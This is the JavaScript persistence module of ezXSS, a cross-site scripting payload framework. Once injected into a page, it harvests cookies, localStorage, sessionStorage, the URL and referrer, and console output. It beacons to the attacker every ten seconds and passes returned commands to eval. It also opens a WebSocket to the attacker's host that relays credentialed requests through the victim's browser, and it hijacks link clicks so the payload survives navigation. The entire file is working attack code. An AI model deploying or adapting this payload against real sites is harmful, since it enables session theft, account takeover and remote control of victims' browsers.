// ezXSS persistent module
var ez_we,ez_las="",ez_ind=null;function ez_pin(){try{ez_rD.type="ping",ez_rD.console=console.ez,ez_cb(ez_rD,ez_eva)}catch(e){}}function ez_stp(){null===ez_ind&&(ez_ind=window.setInterval(ez_pin,10000))}function ez_eva(input){return eval(input)}function eze_ini(){ra_hL(),ez_cb(ez_rD,ez_stp)}function ez_persist(){eze_ini(),ez_pin()}
if(!console.ez){var ms=["log","error","warn"];console.ez="";function ez_for(t,a){var d=new Date().toLocaleTimeString();return "["+d+" "+t+"] "+Array.prototype.join.call(a," ")+"\n";}function ez_wra(m,t){var dm=console[m];console[m]=function (){console.ez=ez_for(t,arguments)+console.ez;dm.apply(console,arguments);};}for(var i=0;i<ms.length;i++){ez_wra(ms[i],ms[i].toUpperCase());}}
function ra_client(){var e="ezXSS",r,t,a,n="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",o;try{r="localStorage"in window&&null!==window.localStorage}catch(e){r=!1}r?(t=localStorage.getItem(e),t||(t=function(){for(var e="",r=0;r<16;r++)e+=n.charAt(Math.floor(Math.random()*n.length));return e}(),localStorage.setItem("ezXSS",t))):(a=document.cookie.split(";").map(function(e){return e.trim()}).filter(function(r){return 0===r.indexOf(e)}),t=a.length>0?a[0].substring(e.length):null,t||(t=function(){for(var e="",r=0;r<16;r++)e+=n.charAt(Math.floor(Math.random()*n.length));return e}(),(o=new Date).setFullYear(o.getFullYear()+1),o=o.toUTCString().replace("GMT",""),document.cookie=e+"="+t+";expires="+o+";path=/;SameSite=lax;"));return t}

function ez_fet(url, method = 'GET', postData = null) {
    return new Promise(function (resolve, reject) {
        var xhr = new XMLHttpRequest();
        xhr.open(method, url, true);
        xhr.withCredentials = true;
        xhr.responseType = "arraybuffer";

        if (method === 'POST' && postData) {
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        }

        xhr.onreadystatechange = function () {
            if (xhr.readyState === 4) {
                var base64 = btoa(
                    new Uint8Array(xhr.response).reduce(
                        (data, byte) => data + String.fromCharCode(byte),
                        ""
                    )
                );
                resolve({
                    statusCode: xhr.status,
                    body: base64,
                    contentType: xhr.getResponseHeader("Content-Type")
                });
            }
        };
        xhr.onerror = function () {
            reject(new Error("Failed to load content"));
        };
        xhr.send(postData);
    });
}

function ez_soc(h, p=0) {
    if (ez_we && ez_we.readyState === WebSocket.OPEN) {
        return;
    }

    ez_we = new WebSocket('wss://' + h);

    ez_we.onopen = function () {
        ez_we.send(JSON.stringify({ 'clientid': ra_client(), 'pass': p, 'origin': location.host }));
    };

    ez_we.onmessage = function (event) {
        const data = JSON.parse(event.data);
        if (data.do == "GET" || data.do == "POST") {
            ez_fet(data.request_uri, data.do, data.postData)
                .then(function (response) {
                    ez_we.send(
                        JSON.stringify({
                            clientid: ra_client(),
                            statusCode: response.statusCode,
                            body: response.body,
                            request_uri: data.request_uri,
                            content_type: response.contentType,
                            pass: p,
                            origin: location.host
                        })
                    );
                })
                .catch(function (error) {
                    console.error(error);
                });
        }
    };


    ez_we.onerror = function (error) {
        //
    };

    ez_we.onclose = function () {
        setTimeout(function() {
            ez_soc(h,p);
        }, 5000);
    };
}

function ra_hL() {
    ez_rD.type = 'init';
    ez_rD.console = console.ez;
    try {
        ez_rD.clientid = ra_client()
    } catch (e) {
        ez_rD.clientid = ""
    }
    try {
        ez_rD.method = "persist"
    } catch (e) {
        ez_rD.method = ""
    }
    try {
        ez_rD.uri = ez_n(location.toString())
    } catch (e) {
        ez_rD.uri = ""
    }
    try {
        ez_rD.cookies = ez_n(document.cookie)
    } catch (e) {
        ez_rD.cookies = ""
    }
    try {
        if (ez_las != '') {
            ez_rD.referer = ez_n(ez_las)
        } else {
            ez_rD.referer = ez_n(document.referrer)
        }
    } catch (e) {
        ez_rD.referer = ""
    }
    try {
        ez_rD["user-agent"] = ez_n(navigator.userAgent)
    } catch (e) {
        ez_rD["user-agent"] = ""
    }
    try {
        ez_rD.origin = ez_n(location.origin)
    } catch (e) {
        ez_rD.origin = ""
    }
    try {
        ez_rD.localstorage = ez_n(window.localStorage);
    } catch (e) {
        ez_rD.localstorage = "";
    }
    try {
        ez_rD.sessionstorage = ez_n(window.sessionStorage);
    } catch (e) {
        ez_rD.sessionstorage = "";
    }
    try {
        ez_rD.dom = "";//ez_n(document.documentElement.outerHTML); //ez_n(document.documentElement.outerHTML)
    } catch (e) {
        ez_rD.dom = ""
    }
    try {
        ez_rD.screenshot = "", ra_c()
        //html2canvas(document.body).then(function (e) {
        //    ez_rD.screenshot = ez_n(e.toDataURL()), ra_c();
        //});
    } catch (e) {
        ez_rD.screenshot = "", ra_c()
    }

    function ra_c() {
        ra_r()
    }
}

function ra_r() {
    document.querySelectorAll('a').forEach(link => {
        link.addEventListener('click', (e) => {
            e.preventDefault();
            let paths = e.path;
            var linkFound = false;
            for (path in paths) {
                for (subpath in path) {
                    if (paths[path].nodeName === 'A') {

                        console.log('A link with target URL ' + paths[path].href + ' was clicked');

                        if (paths[path].hostname === window.location.hostname) {
                            if (paths[path].href.slice(-1) === '#' && paths[path].hash === '') {
                                break;
                            }

                            // Same page click
                            if (paths[path].hash !== "" && paths[path].href.replace(paths[path].hash, '') === window.location.href.split('#')[0]) {
                                var hash = paths[path].hash.replace('#', '');
                                var top = document.getElementById(hash).offsetTop;
                                window.history.pushState("", document.title, paths[path].href);
                                window.scrollTo(0, top);
                                linkFound = true;
                                break;
                            }

                            // Page click on same domain
                            var request = new XMLHttpRequest();
                            request.onload = function () {
                                if (this.readyState == 4) {
                                    ez_las = ez_n(location.toString());
                                    document.getElementsByTagName("html")[0].innerHTML = this.responseText;
                                    window.scrollTo(0, 0);
                                    let title = this.responseText.match(/<title[^>]*>([^<]+)<\/title>/)[1];
                                    document.title = title;
                                    window.history.pushState({ "html": this.responseText, "pageTitle": title }, "", paths[path].href);

                                    let scripts = Array.from(this.responseText.matchAll(/<script[^>]*src=[^>]*>[^>]*<\/script>/g));
                                    for (script in scripts) {
                                        try {
                                            var search = /<script[^>]+src="([^">]+)"/g;
                                            var src = search.exec(scripts[script][0])[1];
                                            var a = document.createElement('script');
                                            a.src = src;
                                            document.body.appendChild(a);
                                        } catch (e) { }
                                    }
                                    eze_ini();
                                }
                            };

                            request.onerror = function () {
                                window.open(paths[path].href, '_blank').focus();
                            };

                            request.open('GET', paths[path].href);
                            request.send();
                        } else {
                            // Click to other domain
                            window.open(paths[path].href, '_blank').focus();
                        }
                        linkFound = true;
                        break;
                    }
                }
                if (linkFound) break;
            }
        });
    });

    /**document.querySelectorAll("form").forEach(form => {
        form.addEventListener("submit", event => {
            event.preventDefault(); // prevent the form from redirecting or refreshing the page
            const formData = new FormData(form); // get all data from the form
            const xhr = new XMLHttpRequest();
            xhr.open("POST", form.action);
            xhr.onload = () => {
                if (xhr.status === 200) {
                    console.log('yes!');
                    document.documentElement.innerHTML = xhr.response;


                    console.log('done!');
                } else {
                    alert("An error occurred while processing the form.");
                }
            };
            xhr.send(formData);
        });
    });**/
}